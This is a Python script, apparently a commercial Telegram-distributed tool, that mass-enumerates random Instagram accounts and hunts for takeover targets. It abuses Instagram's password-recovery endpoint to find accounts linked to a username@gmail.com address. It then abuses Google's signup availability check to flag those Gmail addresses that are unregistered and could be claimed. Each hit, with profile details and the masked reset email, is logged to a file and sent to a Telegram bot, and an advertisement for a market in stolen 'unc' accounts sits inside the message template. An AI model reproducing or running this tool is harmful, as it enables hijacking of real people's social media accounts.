from datetime import datetime, timedelta
import pytz
import sys


TIMEZONE = pytz.timezone("Asia/Kolkata")
EXPIRY_DATETIME = TIMEZONE.localize(datetime(2025, 11, 17, 8, 59))  


now = datetime.now(TIMEZONE)


if now >= EXPIRY_DATETIME:
    print("\n❌ Your premium period has expired.")
    print(f"📅 Expired on: {EXPIRY_DATETIME.strftime('%d %B %Y, %I:%M %p')} (IST)")
    sys.exit()
else:
    remaining = EXPIRY_DATETIME - now
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes = remainder // 60
print("Tool is now running...")
import os
import time
import json
import uuid
import random
import hashlib
import re
import threading
import sys
import string
from datetime import datetime
from random import choice, randrange
import requests
from requests import post as pp
from user_agent import generate_user_agent
from cfonts import render
from colorama import Fore, Style, init

# Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def your_main_program():
    """Your actual program code goes here"""
    clear_screen()
    display_banner()
    
    # Initialize global variables based on user input
    global ID, TOKEN, ID_RANGE, MIN_FOLLOWERS, MIN_POSTS
    ID, TOKEN, ID_RANGE, MIN_FOLLOWERS, MIN_POSTS = get_user_inputs()
    
    # Generate token needed for Gmail checking
    generate_token()
    
    # Start the checker threads
    for _ in range(100):
        threading.Thread(target=razzpy, daemon=True).start()

    # Start the stats loop thread
    threading.Thread(target=stats_loop, daemon=True).start()
    
    # Keep the main thread alive
    while True:
        time.sleep(1)

def rand_color():
    return f'\x1b[38;5;{random.randint(16, 231)}m'

def display_banner():
    """Your banner function with stylish fonts and colors"""
    COLOR_COMBOS = [['green','yellow'], ['magenta','red'], ['blue','cyan'], 
                   ['white','gray'], ['red','magenta'], ['yellow','green']]
    veeru_colors, qe_colors = random.sample(COLOR_COMBOS, 2)
    senpai = render('S x C', colors=veeru_colors, align='center', font='block', background='black')
    "print(S x C)"
    print(f"{rand_color()} Developer :- senpai x candy")
    print(f"{rand_color()}" + "×" * 60)
    
# --- GLOBAL VARIABLES & CONFIG ---

init(autoreset=True)

total_hits = hits = bad_insta = bad_email = good_ig = 0
infoinsta = {}
session = requests.Session()

ID_RANGE = (1629010000, 2500000000) # Default range
MIN_FOLLOWERS = 20
MIN_POSTS = 2

API_CONFIG = {
    "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "ig_sig_key_version": "ig_sig_key_version",
    "signed_body": "signed_body",
    "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "content_type_header": "Content-Type",
    "cookie_header": "Cookie",
    "user_agent_header": "User-Agent",
    "default_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "google_accounts_url": "https://accounts.google.com",
    "google_accounts_domain": "accounts.google.com",
    "referrer_header": "referer",
    "origin_header": "origin",
    "authority_header": "authority",
    "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
    "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
    "token_file": "wasu_token.txt",
    "wasu_domain": "@gmail.com",
}

# --- STATS DISPLAY FUNCTIONS ---

def display_stats():
    global hits, bad_insta, bad_email, good_ig
    
    total_hits = hits
    total_bad = bad_insta + bad_email
    total_good = good_ig
    
    clear_screen()
    
    # Minimal output as requested
    output = (
        f" {Fore.WHITE}𝖌𝖔𝖔𝖉 ☞ {Fore.GREEN}{total_good}{Fore.RESET} \n"
        f" {Fore.WHITE}𝖇𝖆𝖉 ☞ {Fore.RED}{total_bad}{Fore.RESET} \n"
        f" {Fore.WHITE}𝖍𝖎𝖙 ☞ {Fore.YELLOW}{total_hits}{Fore.RESET} \n"
        f"💝═════𝖘𝖊𝖓𝖕𝖆𝖎═════💝\n"
    )
    print(output)

def update_stats():
    display_stats()

# --- USER INPUT & ID GENERATION ---

def get_user_inputs():
    
    ID = input(" ID : ")
    TOKEN = input(" TOKEN : ")
    
    print('\n \x1b[38;5;51m 🗓️ 𝐆𝐋𝐈𝐓𝐂𝐇 - 𝐒𝐞𝐥𝐞𝐜𝐭 𝐘𝐞𝐚𝐫 𝐟𝐨𝐫 𝐔𝐬𝐞𝐫𝐈𝐃 𝐑𝐚𝐧𝐠𝐞 \x1b[38;5;226m')
    ranges = {
        1: (1279001, 17750000),      
        2: (17750000, 279760000),   
        3: (279760000, 900990000),   
        4: (900990000, 1629010000),  
        5: (1629010000, 2500000000), 
        6: (2500000000, 3713668786), 
        7: (3713668786, 5699785217), 
        8: (5699785217, 8507940634), 
        9: (17750000, 57464707083) 
    }
    
    for k in range(1, 10):
        year = 2010 + k
        if k == 9:
            print(f"9 - 2012-2023 (Wide Range)")
        else:
            print(f"{k} - {year}")
    
    year_choice = safe_int_input('\x1b[38;5;226m🔥  𝐄𝐧𝐭𝐞𝐫 𝐘𝐞𝐚𝐫 𝐂𝐡𝐨𝐢𝐜𝐞 (𝟏-𝟗): ', 5)
    min_followers = safe_int_input('\x1b[38;5;46m 💀  𝐌𝐢𝐧𝐢𝐦𝐮m 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬: ', 20)
    min_posts = safe_int_input(' ⚡ 𝐆𝐋𝐈𝐓𝐂𝐇 - 𝐌𝐢𝐧𝐢𝐦𝐮m 𝐏𝐨𝐬𝐭𝐬: ', 0)
    
    clear_screen()
    return ID, TOKEN, ranges.get(year_choice, ranges[5]), min_followers, min_posts

def safe_int_input(prompt, default):
    try:
        value = input(prompt).strip()
        return int(value) if value else default
    except:
        return default

def generate_user_id(range_tuple):
    start, end = range_tuple
    return str(random.randrange(start, end))

# --- GMAIL CHECKER ---

def generate_token():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["user_agent_header"]: str(generate_user_agent())
        }
        
        recovery_url = f"{API_CONFIG['google_accounts_url']}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        res1 = requests.get(recovery_url, headers=headers)
        match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        
        if match:
            tok = match.group(2)
        else:
            raise Exception("Token not found")
            
        cookies = {'__Host-GAPS': host}
        headers2 = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(
            f"{API_CONFIG['google_accounts_url']}/_/signup/validatepersonaldetails",
            cookies=cookies, headers=headers2, data=data
        )
        
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', host)
        
        with open(API_CONFIG["token_file"], 'w') as f:
            f.write(f"{token_line}//{host}\n")
            
    except Exception as e:
        generate_token()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
            
        with open(API_CONFIG["token_file"], 'r') as f:
            token_data = f.read().splitlines()[0]
            
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        
        headers = {
            API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
            API_CONFIG["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            API_CONFIG["user_agent_header"]: generate_user_agent()
        }
        
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull,null,null,null,null,\"NL\",null,null,null,\"GlifWebSignIn\""
                ",null,[],null,null,null,null,2,null,0,1,\"\",null,null,2,2]"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        
        response = pp(f"{API_CONFIG['google_accounts_url']}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + API_CONFIG["wasu_domain"]
            InfoAcc(email, API_CONFIG["wasu_domain"].lstrip('@')) # Gmail Hit
        else:
            bad_email += 1
            update_stats()
            
    except Exception as e:
        pass

# --- INSTAGRAM CHECKER ---

def check_instagram(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    
    headers = {
        API_CONFIG["user_agent_header"]: ua,
        API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
        API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"]
    }
    data = {
        API_CONFIG["signed_body"]: (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        API_CONFIG["ig_sig_key_version"]: '4'
    }
    
    response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).text
    
    if email in response:
        good_ig += 1
        return True
    else:
        bad_insta += 1
        return False

def check(email):
    """Main checking function, now ONLY checks for Gmail availability"""
    if API_CONFIG["wasu_domain"] in email:
        check_gmail(email)
    else:
        pass

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            API_CONFIG["user_agent_header"]: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                              '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                              'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"],
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            API_CONFIG["signed_body"]: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                '"device_id":"android-b93ddb37e983481c",'
                '"query":"' + user + '"}'
            ),
            API_CONFIG["ig_sig_key_version"]: '4'
        }
        response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).json()
        return response.get('email', 'no reset')
    except Exception as e:
        return 'no reset'

# --- REGISTRATION DATE HELPER FUNCTION ---
def get_registration_year(user_id_int):
    """Calculates registration year based on Instagram user ID range."""
    if 1 < user_id_int <= 1278889:
        return 2010
    elif 1279000 <= user_id_int <= 17750000:
        return 2011
    elif 17750001 <= user_id_int <= 279760000:
        return 2012
    elif 279760001 <= user_id_int <= 900990000:
        return 2013
    elif 900990001 <= user_id_int <= 1629010000:
        return 2014
    elif 1629010001 <= user_id_int <= 2369359761:
        return 2015
    elif 2369359762 <= user_id_int <= 4239516754:
        return 2016
    elif 4239516755 <= user_id_int <= 6345108209:
        return 2017
    elif 6345108210 <= user_id_int <= 10016232395:
        return 2018
    elif 10016232396 <= user_id_int <= 27238602159:
        return 2019
    elif 27238602160 <= user_id_int <= 43464475395:
        return 2020
    elif 43464475396 <= user_id_int <= 50289297647:
        return 2021
    elif 50289297648 <= user_id_int <= 57464707082:
        return 2022
    elif 57464707083 <= user_id_int <= 63313426938:
        return 2023
    else:
        return "2024-2025"

# --- INFO & TELEGRAM LOGGING (MODIFIED) ---

def InfoAcc(username, domain):
    global total_hits, ID, TOKEN
    
    account_info = infoinsta.get(username, {})
    
    # --- Data Extraction ---
    user_id = str(account_info.get('pk', 0))
    followers = account_info.get('follower_count', 'N/A')
    following = account_info.get('following_count', 'N/A')
    posts = account_info.get('media_count', 'N/A')
    full_name = account_info.get('full_name', 'N/A')
    bio = account_info.get('biography', 'No bio')
    is_private = account_info.get('is_private', False)
    is_meta = account_info.get('has_public_story', False) # Using an arbitrary field for meta status
    
    # Apply minimum follower filter
    try:
        if int(followers) < MIN_FOLLOWERS:
            return  
    except:
        return
        
    # --- Data Formatting ---
    total_hits += 1 
    reset_email = rest(username)
    email = f"{username}@{domain}"
    reg_date = get_registration_year(int(user_id) if user_id.isdigit() else 0)
    isPraise = "Yes" if is_private else "No"
    meta_status = "Yes" if is_meta else "No"
    
    # --- Telegram Message Template (Updated as per user request) ---
    ss = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 𝗡𝗮𝗺𝗲:       ✦ {full_name}
🔥 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲:   ✦ @{username}
📧 𝗘𝗺𝗮𝗶𝗹:      ✦ {email}

---

👑 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀:   ✦ {followers}
⚡ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴:   ✦ {following}
🎬 𝗣𝗼𝘀𝘁𝘀:      ✦ {posts}

---

💀 𝗕𝗶𝗼:         ✦ {bio}
🔒 𝗣𝗿𝗶𝘃𝗮𝘁𝗲:     ✦ {isPraise}

---

🆔 𝗜𝗗:         ✦ {user_id}
📆 𝗗𝗮𝘁𝗲:        ✦ {reg_date}
⚔️ 𝗠𝗲𝘁𝗮:        ✦ {meta_status}
🌐 𝗨𝗥𝗟:         ✦ https://www.instagram.com/{username}
♻️ 𝗥𝗲𝘀𝗲𝘁 𝗘𝗺𝗮𝗶𝗹: ✦ {reset_email}

━━━━━━━━━━𝐒ᴇɴᴘᴀɪ━━━━━━━━━━must be join : @senpai_era 
━━━━━━━━━━━━━━━━━━━━━━━━
here is cheap pr1ce unc and files: @m4rcket
"""
    
    with open('senpai_hits.txt', 'a') as f:
        f.write(ss + "\n")
    
    # --- Inline Keyboard (Updated as per user request) ---
    inline_keyboard = [[
        {'text': 'DEVLOPER', 'url': 'https://t.me/jaorg'},
        {'text': '𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ', 'url': 'https://t.me/senpai_era'}
    ]]
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                    params={
                        'chat_id': ID,
                        'text': ss,
                        'parse_mode': 'HTML', # Changed to HTML to ensure better compatibility, though plain text works too
                        'reply_markup': json.dumps({'inline_keyboard': inline_keyboard}),
                        'disable_web_page_preview': True
                    },
                    timeout=5) 
    except Exception as e:
        pass

# --- MAIN CHECKER LOOP ---

def razzpy():
    while True:
        user_id = generate_user_id(ID_RANGE)
        
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': user_id,
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            
            if username:
                followers = account.get('follower_count', 0)
                posts = account.get('media_count', 0)
                
                if followers >= MIN_FOLLOWERS and posts >= MIN_POSTS:
                    
                    infoinsta[username] = account
                    email_g = username + API_CONFIG["wasu_domain"]
                    
                    if check_instagram(email_g):
                        check(email_g) 
                    
        except Exception as e:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(1) 

if __name__ == "__main__":
    try:
        your_main_program()
    except KeyboardInterrupt:
        print("\nChecker stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)
        
